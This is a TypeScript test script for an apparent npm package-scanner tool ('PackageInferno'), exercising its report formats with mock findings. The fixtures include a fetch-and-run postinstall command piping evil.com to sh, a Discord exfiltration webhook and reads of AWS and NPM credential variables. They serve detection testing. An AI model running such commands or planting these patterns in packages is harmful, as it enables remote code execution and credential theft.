#!/usr/bin/env tsx
/**
 * Test script to demonstrate all reporters with mock data
 */

import { ReporterFactory } from './src/lib/reporters/base.js';
import { ScanResult, Finding } from './src/types/findings.js';

// Create mock scan results with realistic findings
const mockResults: ScanResult[] = [
  {
    package: 'suspicious-package',
    version: '1.2.3',
    score: 15,
    findings: [
      {
        rule: 'lifecycle_script',
        severity: 'high',
        details: {
          script: 'postinstall',
          command: 'curl http://evil.com | sh',
          explanation: 'Downloads and executes remote code during installation',
        },
      },
      {
        rule: 'url_outside_allowlist',
        severity: 'medium',
        details: {
          url: 'http://evil.com',
          location: 'postinstall script',
          explanation: 'Accesses non-allowed domain',
        },
      },
    ],
    timestamp: new Date().toISOString(),
    scanDuration: 1250,
  },
  {
    package: 'typosquat-lodash',
    version: '4.17.21',
    score: 18,
    findings: [
      {
        rule: 'typosquat_detected',
        severity: 'high',
        details: {
          targetPackage: 'lodash',
          distance: 1,
          explanation: 'Package name is suspiciously similar to popular package "lodash"',
        },
      },
      {
        rule: 'c2_webhook',
        severity: 'high',
        details: {
          webhookUrl: 'https://discord.com/api/webhooks/xxx',
          location: 'index.js:42',
          explanation: 'Sends data to Discord webhook (potential exfiltration)',
        },
      },
      {
        rule: 'env_snoop',
        severity: 'high',
        details: {
          variables: ['AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'NPM_TOKEN'],
          location: 'index.js:15',
          explanation: 'Accesses sensitive environment variables',
        },
      },
    ],
    timestamp: new Date().toISOString(),
    scanDuration: 2340,
  },
  {
    package: 'clean-package',
    version: '2.0.0',
    score: 0,
    findings: [],
    timestamp: new Date().toISOString(),
    scanDuration: 450,
  },
  {
    package: 'slightly-suspicious',
    version: '0.1.0',
    score: 8,
    findings: [
      {
        rule: 'suspicious_pattern',
        severity: 'medium',
        details: {
          pattern: 'eval()',
          location: 'lib/utils.js:89',
          explanation: 'Uses eval() which can execute arbitrary code',
        },
      },
      {
        rule: 'big_base64_blob',
        severity: 'low',
        details: {
          size: 15000,
          location: 'data.js',
          explanation: 'Contains large base64-encoded data (15KB)',
        },
      },
    ],
    timestamp: new Date().toISOString(),
    scanDuration: 890,
  },
];

async function main() {
  console.log('🎨 PackageInferno Reporter Test\n');
  console.log(`Testing with ${mockResults.length} packages:`);
  console.log(`  - ${mockResults.filter(r => r.score >= 12).length} malicious`);
  console.log(`  - ${mockResults.filter(r => r.score >= 7 && r.score < 12).length} suspicious`);
  console.log(`  - ${mockResults.filter(r => r.score === 0).length} clean\n`);

  // Test Console Reporter
  console.log('═'.repeat(80));
  console.log('📺 CONSOLE REPORTER (with colors)');
  console.log('═'.repeat(80));
  const consoleReporter = await ReporterFactory.create('console', {
    verbose: true,
    colorOutput: true,
  });
  const consoleOutput = await consoleReporter.generate(mockResults);
  console.log(consoleOutput);

  // Test JSON Reporter
  console.log('═'.repeat(80));
  console.log('📋 JSON REPORTER (first 50 lines)');
  console.log('═'.repeat(80));
  const jsonReporter = await ReporterFactory.create('json', { verbose: false });
  const jsonOutput = await jsonReporter.generate(mockResults);
  const jsonLines = jsonOutput.split('\n').slice(0, 50);
  console.log(jsonLines.join('\n'));
  if (jsonOutput.split('\n').length > 50) {
    console.log(`\n... (${jsonOutput.split('\n').length - 50} more lines)\n`);
  }

  // Test SARIF Reporter
  console.log('═'.repeat(80));
  console.log('🔒 SARIF REPORTER (first 50 lines)');
  console.log('═'.repeat(80));
  const sarifReporter = await ReporterFactory.create('sarif');
  const sarifOutput = await sarifReporter.generate(mockResults);
  const sarifLines = sarifOutput.split('\n').slice(0, 50);
  console.log(sarifLines.join('\n'));
  if (sarifOutput.split('\n').length > 50) {
    console.log(`\n... (${sarifOutput.split('\n').length - 50} more lines)\n`);
  }

  // Test JUnit Reporter
  console.log('═'.repeat(80));
  console.log('🧪 JUNIT XML REPORTER (first 50 lines)');
  console.log('═'.repeat(80));
  const junitReporter = await ReporterFactory.create('junit');
  const junitOutput = await junitReporter.generate(mockResults);
  const junitLines = junitOutput.split('\n').slice(0, 50);
  console.log(junitLines.join('\n'));
  if (junitOutput.split('\n').length > 50) {
    console.log(`\n... (${junitOutput.split('\n').length - 50} more lines)\n`);
  }

  console.log('═'.repeat(80));
  console.log('✅ All reporters tested successfully!\n');
  console.log('💾 File extensions:');
  console.log(`   Console: .${consoleReporter.getFileExtension()}`);
  console.log(`   JSON:    .${jsonReporter.getFileExtension()}`);
  console.log(`   SARIF:   .${sarifReporter.getFileExtension()}`);
  console.log(`   JUnit:   .${junitReporter.getFileExtension()}\n`);
}

main().catch(error => {
  console.error('❌ Error:', error);
  process.exit(1);
});
